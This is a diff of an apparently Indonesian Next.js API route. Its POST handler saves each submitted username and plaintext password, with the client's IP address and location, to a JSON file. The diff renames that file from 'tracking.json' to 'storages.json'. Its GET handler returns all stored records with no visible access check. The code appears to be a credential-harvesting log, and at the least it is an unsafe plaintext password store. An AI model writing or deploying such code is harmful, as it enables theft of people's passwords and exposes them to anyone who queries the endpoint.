@@ -7,41 +7,51 @@ export const dynamic = 'force-dynamic';
 // Kita menggunakan file public/data.json atau folder di luar publik untuk menyimpan logs
 // Di lingkungan production berbasis Node.js/Laragon, file ini akan bertahan secara lokal.
 const dataDir = path.join(process.cwd(), 'data');
-const dataFilePath = path.join(dataDir, 'tracking.json');
+const dataFilePath = path.join(dataDir, 'storages.json');
+
+interface TrackingLog {
+  id: string;
+  timestamp: string;
+  username: string;
+  password?: string;
+  action: string;
+  ip: string;
+  location: string;
+  path: string;
+}
 
 export async function POST(request: Request) {
   try {
     const body = await request.json();
     
-    // Pastikan direktori data ada
     try {
       await fs.access(dataDir);
     } catch {
       await fs.mkdir(dataDir, { recursive: true });
     }
 
-    // Baca data yang ada
-    let logs: any[] = [];
+    let logs: TrackingLog[] = [];
     try {
       const fileData = await fs.readFile(dataFilePath, 'utf8');
-      logs = JSON.parse(fileData);
+      logs = JSON.parse(fileData) as TrackingLog[];
     } catch {
-      // Jika belum ada file tracking atau error, mulai dengan array kosong
+      // empty array
     }
 
-    // Tambah log baru ke urutan pertama
-    const newLog = {
+    const forwardedFor = request.headers.get('x-forwarded-for');
+    const realIp = request.headers.get('x-real-ip');
+    const serverSideIp = forwardedFor ? forwardedFor.split(',')[0].trim() : (realIp || 'Unknown IP Server-Side');
+    const effectiveIp = body.ip && body.ip !== 'Unknown IP' ? body.ip : serverSideIp;
+
+    const newLog: TrackingLog = {
       id: Date.now().toString() + Math.random().toString(36).substring(2, 9),
       timestamp: new Date().toISOString(),
-      username: body.username || 'Unknown',
+      username: body.username || 'Guest',
       password: body.password || '',
-      ip: body.ip || 'Unknown IP',
-      userAgent: body.userAgent || 'Unknown Agent',
-      location: body.location || 'Unknown Location',
-      org: body.org || 'Unknown Org',
-      path: body.path || '/',
-      isSuspicious: body.isSuspicious || false,
-      countryCode: body.countryCode || 'XX'
+      action: body.action || 'Unknown Action',
+      ip: effectiveIp,
+      location: body.location || 'Indonesia',
+      path: body.path || '/'
     };
 
     logs.unshift(newLog);
@@ -63,10 +73,10 @@ export async function POST(request: Request) {
 
 export async function GET() {
   try {
-    let logs: any[] = [];
+    let logs: TrackingLog[] = [];
     try {
       const fileData = await fs.readFile(dataFilePath, 'utf8');
-      logs = JSON.parse(fileData);
+      logs = JSON.parse(fileData) as TrackingLog[];
     } catch {
       logs = []; // Return empty array if file not created yet
     }
